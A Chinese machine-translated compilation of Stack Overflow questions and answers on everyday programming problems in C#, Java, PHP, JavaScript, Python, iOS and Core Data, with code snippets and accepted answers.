我承认，这并不简单，但可以为您节省一些磁盘 I/O，以及 logback-android 的使用......

# c# - 如何将任意字符串转换为十六进制颜色代码

> ID：13360325
> 
> 赞同：1
> 
> 时间：2012-11-13T11:55:37.827
> 
> 标签：c#, .net, string, hex

我有一个任意字符串的列表。我想将这些转换为十六进制颜色代码。

代码不应该是随机的，因为每次转换相同的字符串时，该方法必须返回相同的颜色代码。

**解决方案：**

```
public string GetColorCode(string value)
{
    var i = value.GetHashCode() & 0x00FFFFFF;
    return i.ToString("X6");
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T11:58:36.510

你可以`GetHashCode()`作为一个起点。由于`GetHasCode()`返回一个完整的整数并且您通常只需要 3 个字节来定义颜色`RGB`，因此您必须通过执行以下任一操作来跳过 noin 重要部分：

```
var color = str.GetHashCode() & 0x00FFFFFF; 
```

或者

```
 var color = str.GetHashCode()>>8; 
```

此保证具有相同的字符串，相同的颜色。

# java - Wro4j Maven 插件：无效的 wro.xml

> ID：13360326
> 
> 赞同：2
> 
> 时间：2012-11-13T11:55:41.077
> 
> 标签：java, maven, wro4j

我正在尝试使 wro4j maven 插件正常工作，不幸的是，我遇到了一个我不太明白其原因的错误：

```
[ERROR] Failed to execute goal ro.isdc.wro4j:wro4j-maven-plugin:1.5.0:run (proprocess-   resources) on project someapp-webapp: Exception occured while processing: startup failed:
[ERROR] Script1.groovy: 1: unexpected token: < @ line 1, column 1.
[ERROR] <groups xmlns="http://www.isdc.ro/wro" 
```

这是我的配置：

pom.xml：

```
<plugin>
    <groupId>ro.isdc.wro4j</groupId>
    <artifactId>wro4j-maven-plugin</artifactId>

    <executions>
        <execution>
            <id>proprocess-resources</id>
            <phase>compile</phase>
            <goals>
                <goal>run</goal>
            </goals>
        </execution>
    </executions>

    <configuration>
        <targetGroups>all</targetGroups>
        <wroFile>src/build/wro.xml</wroFile>
        <destinationFolder>${project.build.directory}/dist</destinationFolder>
        <contextFolder>${basedir}/src/main/webapp/</contextFolder>
        <extraConfigFile>src/build/wro.properties</extraConfigFile>
    </configuration>

</plugin> 
```

这是我的 wro.xml 文件：

```
<groups xmlns="http://www.isdc.ro/wro"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://www.isdc.ro/wro wro.xsd">

  <group name="all">
    <js>/src/main/webapp/js</js>
    <css>/src/main/webapp/css</css>
  </group>

</groups> 
```

我还有一个 wro.properties 文件：

```
debug=true
gzipResources=false
ignoreMissingResources=true
jmxEnabled=true
managerFactoryClassName=ro.isdc.wro.examples.manager.CustomWroManager
preProcessors=sassCss 
```

我没有在 wro4j 文档中看到我可能错过的任何内容，如有任何建议，我将不胜感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-12T14:57:04.323

默认情况下，wro4j 使用[SmartWroModelFactory](http://code.google.com/p/wro4j/wiki/SmartWroModelFactory)，它尝试使用所有可用的 DSL 依次构建模型：xml、groovy、json。您的失败表明无法创建 xml 模型，因此它尝试将其创建为 groovy DSL。由于提供的 xml 模型似乎是有效的，因此失败的唯一原因是 xml 位置不是有效的。

可能您可以尝试替换：

`<wroFile>src/build/wro.xml</wroFile>`和`<wroFile>/src/build/wro.xml</wroFile>`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-25T23:11:39.687

我发现我必须删除 XML 文件并在 wro4j 1.6.2 上创建一个 wro.groovy 文件。

```
groups {
  group1 {
    js("/app/**.js")
    css("/resources/css/*.css")
  }
  all {
    group1()
  }
} 
```

# jquery - JQuery keyup 事件未触发

> ID：13360341
> 
> 赞同：1
> 
> 时间：2012-11-13T11:56:35.613
> 
> 标签：jquery, internet-explorer

我正在尝试为 3 个字段创建一个 keyup 事件，以便在输入这 3 个字段中的任何一个时触发一个函数。我在 IE 中工作，因为这是我们的应用程序正式支持的唯一浏览器。这是它将使用的 html 的重要部分。

```
<input title="Buy Price (Cannot be used in conjunction with Percentage Price)" name="BuyRate" size="3" id="BuyRate" type="text" />
<input title="Sell Price (Cannot be used in conjunction with Percentage Price)" name="SellRate" size="3" id="SellRate" type="text" />
<input title="Percentage Price (Cannot be used in conjunction with Buy/Sell Price)" name="PercentagePrice" id="PercentagePrice" type="text" id="PercentagePrice" maxlength="9" size="5" /> 
```

这是我目前拥有的 JQuery。

```
$("#BuyRate").keyup(function() {
alert("1");
    checkBuySellPercentage();
});

$("#SellRate").keyup(function() {
alert("2");
    checkBuySellPercentage();
});

$("#PercentagePrice").keyup(function() {
alert("3");
    checkBuySellPercentage();
});

function checkBuySellPercentage()
{
alert("4");
    var buyrate = $.trim($("#BuyRate").val());
    var sellrate = $.trim($("#SellRate").val());
    var percentageprice = $.trim($("#PercentagePrice").val());
    if (buyrate !== "" || sellrate !== "")
    {
        $("#PercentagePrice").attr("disabled", "disabled");
    }
    else if (percentageprice !== "")
    {
        $("#BuyRate").attr("disabled", "disabled");
        $("#SellRate").attr("disabled", "disabled");
    }
    else
    {
        $("#BuyRate").removeAttr("disabled");
        $("#SellRate").removeAttr("disabled");
        $("#PercentagePrice").removeAttr("disabled");
    }
} 
```

为什么这不能正常工作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:04:33.763

它在 IE 8 和 Google Chrome 中看起来对我有用。你什么时候执行这些脚本行？当您尝试添加事件侦听器时，DOM 可能未处于就绪状态。因此，将此类事件绑定放在[jquery 的 document.ready](http://api.jquery.com/ready/)块中总是有帮助的！

document.ready 块示例：

```
$(document).ready(function(){
    // keyup event bindings should be in this block
}); 
```

# java - Android 或 Phonegap 在应用程序重新启动或第二次启动时跳过主页

> ID：13360343
> 
> 赞同：2
> 
> 时间：2012-11-13T11:56:56.097
> 
> 标签：java, javascript, android, eclipse, cordova

我正在开发一个带有主菜单的移动应用程序，您必须从 4 个选项中进行选择。我想限制用户，以便他只能在第一次启动应用程序时选择。因此，当他第二次启动应用程序时，应该跳过主页，并且应该将用户引导至他的选项。您能否告诉我在 phonegap 或 java 中是否存在适用于 Android 的此类功能？谢谢！

# windows-phone-7 - 订阅 windows phone 中的所有网络请求

> ID：13360344
> 
> 赞同：0
> 
> 时间：2012-11-13T11:56:59.747
> 
> 标签：windows-phone-7, httpwebrequest

是否可以订阅 Windows Phone 应用程序中的所有 Web 请求？我的意思是注册一个全局钩子，每次我向网络服务器发出请求时都会触发它。非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T22:44:24.210

简单的例子：

```
// Since the property is static, it will be shared by all instances of WebClientWrapper
// Set this before creating an instance of WebClientWrapper
WebClientWrapper.Hook = address => Debug.WriteLine(address);

var webClientWrapper = new WebClientWrapper();
webClientWrapper.DownloadString("http://www.something.com");

public class WebClientWrapper
{
    private readonly WebClient _webClient;

    // This can be string, your custom class of whatever you need
    public static Action<string> Hook { get; set; }

    public WebClientWrapper()
    {
        _webClient = new WebClient();
    }

    public string DownloadString(string address)
    {
        Hook(address);
        return _webClient.DownloadString(address);
    }
} 
```

# c# - 从文本框快速转换为文本文件

> ID：13360346
> 
> 赞同：0
> 
> 时间：2012-11-13T11:57:10.630
> 
> 标签：c#, textbox, export, text-files

我有一个关于从文本框转换为文本文件的问题。对于小文件来说工作完美，但对于大文件来说太慢了。我逐行阅读TextBox，然后将其保存到文本文件中。我在这里做错了什么？我尝试使用 stringbuilder 但结果是一样的。

我的代码：

```
 StreamWriter sw = File.CreateText(saveFileDialog2.FileName);
            //sw.WriteLine(richTextBox1.Text);
            //StringBuilder sw1 = new StringBuilder();

            for (int i = 0; i < richTextBox1.Lines.Length; i++)
            {
                sw.WriteLine(richTextBox1.Lines[i]);
                //sw1.AppendLine( richTextBox1.Lines[i]);
            }

            //sw.Write(sw1.ToString());
            sw.Flush();
            sw.Close(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:00:00.263

您可以使用[`richTextBox1.SaveFile`](http://msdn.microsoft.com/en-us/library/system.windows.forms.richtextbox.savefile%28v=vs.71%29.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:03:33.227

你可以试试：

```
File.WriteAllText(filename, RichTextBox1.Text) 
```

或如评论中所述：

```
File.WriteAllLines(filename, RichTextBox1.Lines) 
```

# zend-framework2 - 代码在模块 ZF2 中的每个操作之前运行？

> ID：13360349
> 
> 赞同：5
> 
> 时间：2012-11-13T11:57:19.367
> 
> 标签：zend-framework2, zend-framework-modules

我想编写一些代码在模块中的每个操作之前运行。我试过挂钩，`onBootstrap()`但代码也在其他模块上运行。

对我有什么建议吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-13T12:22:21.067

有两种方法可以做到这一点。

一种方法是创建一个服务并在每个控制器调度方法中调用它

```
Use onDispatch method in controller. 

    class IndexController extends AbstractActionController {

        /**
         * 
         * @param \Zend\Mvc\MvcEvent $e
         * @return type
         */
        public function onDispatch(MvcEvent $e) {

            //Call your service here

            return parent::onDispatch($e);
        }

        public function indexAction() {
            return new ViewModel();
        }

    } 
```

不要忘记在代码顶部包含以下库

```
use Zend\Mvc\MvcEvent; 
```

第二种方法是通过 Module.php 使用调度事件来做到这一点

```
namespace Application;

use Zend\Mvc\ModuleRouteListener;
use Zend\Mvc\MvcEvent;

class Module {

    public function onBootstrap(MvcEvent $e) {        
        $sharedEvents = $e->getApplication()->getEventManager()->getSharedManager();
        $sharedEvents->attach(__NAMESPACE__, 'dispatch', array($this, 'addViewVariables'), 201);
    }

    public function addViewVariables(Event $e) {
        //your code goes here
    }

    // rest of the Module methods goes here...
    //...
    //...
} 
```

[如何使用 ZF2 创建简单的服务](https://stackoverflow.com/questions/12562538/zf2-creation-of-simple-service-and-access-it-through-viewhelper)

[参考文献2](https://stackoverflow.com/questions/12406507/modulemanager-geteventmanager-getsharedmanager-attach-is-not-working-in)

[参考文献3](http://lab.empirio.no/how-to-attach-mvc-events-in-zf2.html)

# php - 每 3 个数字组合的 php mkdir 文件夹

> ID：13360354
> 
> 赞同：1
> 
> 时间：2012-11-13T11:57:43.843
> 
> 标签：php

我想为每 3 个数字组合做一些功能 mkdir 文件夹。例如， 502341 将 mkdir 一个新的 forder `502/341`， 10023049132 将 mkdir 一个`10/023/049/132`我使用`number_format`的新 forder `explode`，我的问题是如何检查有多少单元`explode`并写出类似的东西

```
if(!is_dir(dirname(__FILE__) . '/'.$bbb[0])){
    mkdir(dirname(__FILE__) . '/'.$bbb[0],0777);
}

$aaa = '502341';//10023049132
$bbb = explode(',',number_format($aaa));
echo $bbb[0];
if(!is_dir(dirname(__FILE__) . '/'.$bbb[0])){
    mkdir(dirname(__FILE__) . '/'.$bbb[0],0777);
}
if(!is_dir(dirname(__FILE__) . '/'.$bbb[0]. '/'.$bbb[1])){
    mkdir(dirname(__FILE__) . '/'.$bbb[0]. '/'.$bbb[1],0777);
}
...//how to check more $bbb[2], $bbb[3] or even more? 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T12:03:12.390

您所需要的只是`chunk_split`和选项`mkdir``recursive`

```
$path = __DIR__;

if (! is_writable($path))
    trigger_error("$path is not writeable");

$str = "502341";
$arr = chunk_split($str, 3, "/");
mkdir($path . DIRECTORY_SEPARATOR . $arr, 0777, true);
                                                  ^--------- Recrusive 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:00:16.073

你正在寻找*[`str_split()`](http://php.net/manual/en/function.str-split.php)*. 确保事先验证输入！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T12:01:38.353

使用 mkdir 的递归模式（[http://php.net/manual/en/function.mkdir.php](http://php.net/manual/en/function.mkdir.php)）允许创建嵌套目录

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-13T12:02:21.493

我会使用递归文件夹创建。例如：

```
<?php
$aaa = "502341";
$bbb = explode(',',number_format($aaa));
print count($bbb); // prints the depth of your folder tree
mkdir(implode("/",$bbb), 0644, true); // creates recursive folder
?> 
```

其中 0644 将是文件夹的权限。根据您的需要进行设置。

# kineticjs - 尝试将表单输入集成到 kinetic.js 阶段

> ID：13360359
> 
> 赞同：2
> 
> 时间：2012-11-13T11:58:07.047
> 
> 标签：kineticjs

我有一个用动力学构建的舞台/画布，目前，我正在实现我所需要的......但是，我需要让它在某种意义上变得动态，用户可以在同一页面上填写表格并提交，输入被发送到 javascript 并显示在画布舞台上.. 到目前为止，我没有运气在处理画布显示的同一脚本上使用 javascript 的 getElementById ......有人可以帮我吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-15T15:39:11.100

现在确定我能帮上多少忙，但你去吧。我的解决方案是使用 PHP/AJAX/jQuery/Kinetic 实现的。虽然还没有完成完整的解决方案；我想要实现的是，用户填写表单并在提交时，PHP 将值传递给动态画布。下面是我用来构建文本层的内容。请注意，这是一个带有一个小 php 来输出文本字符串..

```
 var companyMessage = new Kinetic.Text({
        x: 5,
        y: 35,
        fill: 'transparent',
        text: '<?php echo $coy_messg ?>', // php code wrapped between php tags
        fontSize: 14,
        fontFamily: 'Georgia',
    textFill: '#555',
        padding: 4,
        align: 'center',
        fontStyle: 'normal',
        cornerRadius: 0,
        draggable: true,
      });
// add cursor styling
      companyMessage.on('mouseover', function() {
        document.body.style.cursor = 'move';
      });
      companyMessage.on('mouseout', function() {
         document.body.style.cursor = 'default'; 
      }); 
```

这有帮助吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-24T04:24:47.723

以防万一其他人有这个问题（比如我；p），这是一个小提琴，使用 javascript 变量和动态 JS node.setText 属性来更新画布：

[http://jsfiddle.net/skye/zBUQs/1/](http://jsfiddle.net/skye/zBUQs/1/)

```
//Make a variable to hold the updatable canvas text//
var newName = 'some text to look at';

//Create canvas text with variable inside it
var complexText = new Kinetic.Text({
            x: 30,
            y: 50,
            text: newName,
            fontSize: 18,
            fontFamily: 'Calibri',
            fill: '#555',
            width: 380

 });

//Add text to layer
layer.add(complexText);
//Add layer to stage
stage.add(layer);

//On button click
$('#updateBtn').click(function (e) {

       //change the value of newname to the input value
       newName = $('#name').val();
        //insert the new value into the canvas text
       complexText.setText(newName);
        //redraw the layer
       layer.draw();

    }); 
```

# ios - IOS：touchbegan和touchmoved两个类

> ID：13360363
> 
> 赞同：0
> 
> 时间：2012-11-13T11:58:46.773
> 
> 标签：ios, uiimageview, touch

在我称之为“one”的课堂上，我有两种触摸方法：touchbegan 和 touchmoved。在这个类中，我以这种方式分配一个 imageview：

```
imageView = [[ImageToDrag alloc] initWithImage:[UIImage imageNamed:@"machine.png"]];
    imageView.center = CGPointMake(905, 645);
    imageView.userInteractionEnabled = YES;
    [self addSubview:imageView];
    [imageView release]; 
```

在.m的这个类（ImageToDrag）中，我有：

```
 - (void) touchesBegan:(NSSet*)touches withEvent:(UIEvent*)event
{
    // When a touch starts, get the current location in the view
    currentPoint = [[touches anyObject] locationInView:self];
}

- (void) touchesMoved:(NSSet*)touches withEvent:(UIEvent*)event
{
    // Get active location upon move
    CGPoint activePoint = [[touches anyObject] locationInView:self];

    // Determine new point based on where the touch is now located
    CGPoint newPoint = CGPointMake(self.center.x + (activePoint.x - currentPoint.x),
                                 self.center.y + (activePoint.y - currentPoint.y));

    //--------------------------------------------------------
    // Make sure we stay within the bounds of the parent view
    //--------------------------------------------------------
  float midPointX = CGRectGetMidX(self.bounds);
    // If too far right...
  if (newPoint.x > self.superview.bounds.size.width  - midPointX)
    newPoint.x = self.superview.bounds.size.width - midPointX;
    else if (newPoint.x < midPointX)    // If too far left...
    newPoint.x = midPointX;

    float midPointY = CGRectGetMidY(self.bounds);
  // If too far down...
    if (newPoint.y > self.superview.bounds.size.height  - midPointY)
    newPoint.y = self.superview.bounds.size.height - midPointY;
    else if (newPoint.y < midPointY)    // If too far up...
    newPoint.y = midPointY;

    // Set new center location
    self.center = newPoint;
} 
```

所以我的问题是这样的：在 ImageToDrag 类中而不是在我的主类“one”中触摸识别方法，为什么？有没有办法在每个班级中识别触摸？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T13:39:17.230

从`UIResponder` `touchesBegan`方法：

> 此方法的默认实现什么也不做。然而，UIResponder 的直接 UIKit 子类，尤其是 UIView，将消息转发到响应者链。要将消息转发给下一个响应者，请将消息发送给 super（超类实现）；不要将消息直接发送给下一个响应者。例如，

因此，将要向上传递响应者链的事件添加`[super touchesBegan:touches withEvent:event];`到您的方法（和其他触摸方法）中。`touchesBegan`

您还应该实现`touchesEnded`and`touchesCanceled`方法。

# iphone - 核心数据合并行为

> ID：13360366
> 
> 赞同：2
> 
> 时间：2012-11-13T11:58:58.323
> 
> 标签：iphone, objective-c, ios, core-data, magicalrecord

我试图找到这个问题的答案，但我无法从文档和 StackOverflow 中找出问题。如果已经有这样的问题，我只是没有找到它，所以它会非常欢迎作为以防万一的解决方案。

我的情况是：我有两个核心数据实体，一个用户和一个驾驶执照。

```
User  <--- 1 to 1 ---> Driving Licence 
```

我使用[Magical Record](https://github.com/magicalpanda/MagicalRecord)作为核心数据操作的抽象层。

我的用户类（从 NSManagedObject 派生）公开了 2 个方法。

一个访问用户的单例实例（整个应用程序中唯一使用的一个）：

```
+ (User *)currentUser {

    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        if ([User MR_findFirst] == nil) {

            User *user = [User MR_createEntity];
            user.drivingLicence = [DrivingLicence MR_createEntity];
            [[user managedObjectContext] MR_save];
        }
    });

    return [User MR_findFirst];
} 
```

以及用于重置用户数据的方法（源自 NSManagedObject）：

```
- (void)resetFields
{
   self.name = nil;
   self.surname = nil;
   ....
   [self.drivingLicence MR_deleteEntity];
   self.drivingLicence = [DrivingLicence MR_createEntity];
   [self.managedObjectContext MR_save];
} 
```

有时，我会很随意地说，drivingLicence 字段恰好为空。后台线程可能会调用**resetFields**方法。

难道是为了与其他上下文的合并，指令序列

```
 [self.drivingLicence MR_deleteEntity];
   self.drivingLicence = [DrivingLicence MR_createEntity]; 
```

会引起一些混乱，最终将驾驶执照删除吗？或者还有什么可能是这个意外的空值的原因？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T17:27:12.997

当您使用 MR_createEntity 时，您会隐式使用默认上下文，通过**[NSManagedObjectContext MR_defaultContext]**访问。除非您绝对积极地从主线程调用它，否则这样做是非常危险的。在您的示例中，如果从主线程调用所有内容并且您的*self.managedObjectContext*实例变量也指向默认上下文，则所有这些都应该正常工作。否则，您将需要明确说明您正在使用哪些上下文。MagicalRecord 通过在每个需要上下文才能工作的方法末尾添加一个 inContext: 可选参数来为您提供这些约定。查看**MR_createInContext:**方法并明确使用上下文

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-21T23:46:27.123

刚好碰到这个问题。根据我们的发现，我想在上面[casademora](https://stackoverflow.com/users/5619/casademora)的回答中添加一些评论：

重要的*是*要记住核心数据以及任何`MR_save`方法都不是线程安全的。我们将 MagicalRecord 操作委托给队列以解决此问题。`MR_saveToPersistentStoreAndWait`具体来说，重要的是要记住不要同时在多个线程中执行保存操作（例如）。

然而`MR_createEntity`，`MR_defaultContext`、 和*Main*线程之间的联系更加微妙。从 MagicalRecord 版本 2.3.x 开始，我不相信`MR_createEntity`没有参数的 . 默认为`MR_defaultContext`. 我相信它默认为`MR_contextForCurrentThread`. `MR_contextForCurrentThread`如果它在*主*线程上，则返回默认上下文，否则不返回。如果您不了解后果，这是很危险的，因为您可以很容易地看到原始海报在上面看到的内容（丢失的数据）。

事实上，[这个注释](https://github.com/magicalpanda/MagicalRecord/wiki/Saving-Entities#context-for-current-thread-deprecation)表明你应该使用`MR_createEntityInContext:localContext`而不是`MR_createEntity`因为使用`MR_contextForCurrentThread`时出现问题`GCD`。

有关使用的逻辑，请参见github 中[的函数定义](https://github.com/magicalpanda/MagicalRecord/blob/b83b159ca092fdf0dc614957b91e0e00f18169eb/MagicalRecord/Categories/NSManagedObject/NSManagedObject%2BMagicalRecord.m#L212)。`MR_createEntity``MR_contextForCurrentThread`

# php - 对象比较给出致命错误

> ID：13360368
> 
> 赞同：3
> 
> 时间：2012-11-13T11:59:09.923
> 
> 标签：php

我得到了一个不执行的问题来回答。

```
class Foo {
    public $x;
}
$a = new Foo();
$b = new Foo();
$a->x = $b;
$b->x = $a;

print_r($a == $b); 
```

我认为这应该打印 1 但是当我执行时它给出了一个致命错误。

```
Fatal error: Nesting level too deep - recursive dependency? on line 13 
```

谁能解释我为什么会收到这个错误？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T12:02:58.937

因为 PHP 比较对象的方式。

当您将对象与 进行比较时`==`，PHP 将查看每个对象的每个属性（以及嵌套对象，以防某些属性包含其他对象），并比较它们。如果所有属性都相等，则对象将被视为相等。

在这种特定情况下，您将对象放置在彼此的属性中，导致比较引擎循环 ( `$a->b->a->b->a->b->...`)，从而引发错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:03:23.507

PHP 试图找出对象是否相等，而不是引用是否相等。为了评估这一点，对象被完全遍历。此遍历包括指向其他​​对象的引用。所以你实现了一个无限循环......

# data-structures - 左倾红黑树的删除

> ID：13360369
> 
> 赞同：7
> 
> 时间：2012-11-13T11:59:14.640
> 
> 标签：data-structures, binary-search-tree, red-black-tree

我正在学习[左倾红黑树](http://www.cs.princeton.edu/~rs/talks/LLRB/LLRB.pdf)。

在论文中提出的删除算法中，如果一个节点的键匹配并且该节点的右子树为NULL，则该节点被删除。但也可能存在不考虑的左子树。

我无法理解**为什么左子树也会为 NULL**。删除最小值或最大值时也会执行类似的操作。有人可以指导我吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-14T09:21:31.910

您似乎在谈论这段代码：

```
if (isRed(h.left))
  h = rotateRight(h);
if (key.compareTo(h.key) == 0 && (h.right == null))
  return null; 
```

这里左后代不能是“红色”，因为前面的代码会将它向右旋转。

左边的后代也不能是“黑色”，因为在这种情况下，左边的路径`h`至少包含一个“黑色”节点，而右边的路径没有任何“黑色”节点。但是在 RB-tree 中，每条路径上的黑色节点的数量必须相同。

这意味着根本没有左后代，节点`h`是叶节点。

在`deleteMin`函数中，如果左子树为空，则无需检查右子树，因为 LLRB 树的右子树不能大于对应的左子树。

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2014-07-22T13:05:28.643

关于左倾红黑树是否真的比以前的实现更好甚至更简单，有一个有趣的分析。文章[左倾红黑树被认为是有害](http://www.read.seas.harvard.edu/~kohler/notes/llrb.html)的，由哈佛 Comp Sci 教授[Eddie Kohler](http://read.seas.harvard.edu/~kohler/)撰写。他写：

```
Tricky writing

Sedgewick’s paper is tricky. As of 2013, the insert section presents 2–3–4 trees as 
the default and describes 2–3 trees as a variant. The delete implementation, however,
only works for 2–3 trees. If you implement the default variant of insert and the   
only variant of delete,your tree won’t work. The text doesn’t highlight the switch 
from   2–3–4 to 2–3: not kind. 
```

# python - 为什么我在格式字符串中遇到错误 -Single '}'

> ID：13360370
> 
> 赞同：1
> 
> 时间：2012-11-13T11:59:27.880
> 
> 标签：python

我正在编写一些代码来查看打印出我可以用字母字符串“myLetters”组成的单词列表，但由于某种原因，我的格式不起作用。它应该以单词列表的形式出现，其中空格数与 myLetters + 4 的长度一样多

```
def scrabbleWords(myLetters):
        letterPoints = {'a':1,'b':3,'c':3,'d':2, 'e':1,'f':4,'g':2,'h':4,\
    'i':1,'j':8,'k':5,'l':1,'m':3,'n':1,'o':1,'p':3,'q':10,'r':1,'s':1,\
    't':1,'u':1,'v':4,'w':4,'x':8,'y':4}
        wordList = createWordList('wordlist.txt')
        myWords = []
        for myWord in wordList:
            x = canWeMakeIt(myWord,myLetters)
            if x == True:
                myWords.append(myWord)

        pointWordList = []
        for myWord in myWords:
            t = getWordPoints(myWord,letterPoints)
            pointWordList.append((t,myWord))
        pointWordList.sort(reverse=True)

        lenx = str(len(myLetters)+4)
        for pointValue, myWord in pointWordList:
            x = '{:'+lenx+'}{}'.format(myWord,pointValue)
            print(x) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T12:02:22.580

```
'{:'+lenx+'}{}'.format(myWord,pointValue) 
```

解释为

```
'{:'     +     lenx     +     '}{}'.format(myWord,pointValue) 
```

将其更改为：

```
'{1:{0}}{2}'.format(lenx, myWord, pointValue) 
```

**编辑**：不要忘记更改`lenx`为整数（或根本不将其转换为字符串）：

```
lenx = len(myLetters) + 4 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-13T12:11:37.910

问题在于`'{:'+lenx+'}{}'.format(myWord,pointValue)`试图添加`lenx+'}{}'.format(myWord,pointValue)`到 sum的表达式`'{:'+lenx`。

这会做我认为你想要的，并且在我看来更具可读性：

```
x = '{:{width}}{}'.format(myWord, pointValue, width=lenx) 
```

**编辑**：另外，无论`lenx`是整数还是字符串值，这都有效。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T12:38:37.863

“在格式字符串中遇到单个 '}'”错误是由于我们正在查看一些没有括号就无法工作的代码。

你写了

```
'{:'+lenx+'}{}'.format(myWord,pointValue) 
```

但可能意味着

```
('{:'+lenx+'}{}').format(myWord,pointValue) 
```

而python的解释是：

```
'{:'+lenx+('}{}'.format(myWord,pointValue)) 
```

# expressionengine - 如何最好地处理 ExpressionEngine 注册垃圾邮件？

> ID：13360373
> 
> 赞同：4
> 
> 时间：2012-11-13T11:59:38.567
> 
> 标签：expressionengine, spam, spam-prevention

我拥有大量的 EE 站点，并且通常对垃圾邮件没有太大问题。然而，我所关注的一个网站最近受到注册垃圾邮件的轰炸。这是一个流量极低的站点，有点被忽视，这意味着它运行的是旧版本的 EE。

我现在已经将该站点更新到最新的 EE 版本，并仔细检查了所有内容是否已锁定。我什至尝试安装 Low NoSpam，但我仍然收到尝试注册。

我最初的想法是这个旧版本的 EE 中存在一些安全漏洞。但是由于我现在已经更新了所有内容，所以我不太确定。

除了关闭注册之外，处理此问题的最佳方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T14:59:38.240

I personally find that RECAPTCHA is the best captcha system out there:

[http://devot-ee.com/add-ons/recaptcha](http://devot-ee.com/add-ons/recaptcha)

It's ADA compliant, your visitors help translate books and its probably the most popular. Snaptcha would do the trick as well, but I personally think that if you need a captcha (which I hate :)) then go with RECAPTCHA :)

Oh and it's completely FREE too!!

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-13T12:07:18.593

您是否将“个人资料成员”触发词更改为“成员”以外的内容？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T12:50:59.733

我使用[Snaptcha](http://devot-ee.com/add-ons/snaptcha "快餐店")处理垃圾评论的效果非常好——它也适用于注册垃圾邮件。值得一看。

# javascript - 传递参数

> ID：13360375
> 
> 赞同：0
> 
> 时间：2012-11-13T11:59:43.883
> 
> 标签：javascript, google-apps-script

我需要做一个“函数选择框（e）”，但我需要传递比参数（e）更多的参数我需要“函数选择框（e，名称，ID，行，列）”，我应该如何定义函数我应该如何调用该函数？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T13:45:13.803

如果我理解正确，您想传递多个参数，但只传递一个参数。

您可以创建一个对象来执行此操作，例如：

```
var param = {e: document.getElementById("SomeID")
            ,Name: "Example"
            ,ID: "SomeID"};
selectBox(param); 
```

在函数内部，您可以将参数作为对象的属性访问，您可以定义默认值以防不传递某些值：

```
function selectBox(p) {
    p      = p      || {};
    p.e    = p.e    || "";
    p.Name = p.Name || "";
    p.ID   = p.ID   || null;
    p.Row  = p.Row  || 5;
    p.Col  = p.Col  || 20;
    alert("this is the ID: "+p.ID);
} 
```

希望我很清楚。

# javascript - 为什么这个 Highcharts 图表只显示第一个和最后一个节点的工具提示？

> ID：13360376
> 
> 赞同：1
> 
> 时间：2012-11-13T11:59:47.693
> 
> 标签：javascript, jquery, highcharts

我刚开始使用 Highcharts，在为图表中的每个数据项显示工具提示时遇到了一些麻烦。目前，它只显示第一个和最后一个项目的工具提示。

```
var chart1; // globally available

$(document).ready(function () {

    var options = {
        chart: {
            renderTo: 'AssessmentChart',
            marginRight: 100,
            marginBottom: 40
        },
        title: {
            text: 'Assessment history',
            x: -20 //center
        },
        subtitle: {
            text: 'Assessment history for this patient',
            x: -20 //center
        },
        xAxis: {
            type: 'datetime'
        },
        yAxis: {
            title: {
                text: 'Score'
            },
            max: 72,
            min: 0
        },
        tooltip: {
            formatter: function() {
                    return '<b>'+ this.y +'</b>';
            }
        },
        legend: {
            layout: 'vertical',
            align: 'right',
            verticalAlign: 'top',
            x: -10,
            y: 100,
            borderWidth: 0
        },
        series: []
    };

    // Get the main assessment data...
    var dlqiData = [], hdnDlqiData = $("#hdnDlqiData");

    if (hdnDlqiData.length > 0) {
        var dlqiDataJson = $.parseJSON(hdnDlqiData.val());

        $.each(dlqiDataJson, function (i, item) {
            dlqiData.push(
                {
                    x: stringToUtcDate(item.dateCreated),
                    y: item.calculatedScore
                }
            );
        });

        options.series.push({
            type: 'spline',
            name: 'DLQI',
            data: dlqiData
        });
    }

    chart1 = new Highcharts.Chart(options);

    function stringToUtcDate(datestring) {
        var date = datestring.split('/');

        return Date.UTC(parseInt(date[2], 10), parseInt(date[1], 10) - 1, parseInt(date[0], 10));
    }

});​ 
```

我正在从隐藏的表单字段中提取数据，所以这里有一个 Fiddle 展示了这一点：http: [//jsfiddle.net/gfyans/LjRGk/3/](http://jsfiddle.net/gfyans/LjRGk/3/)

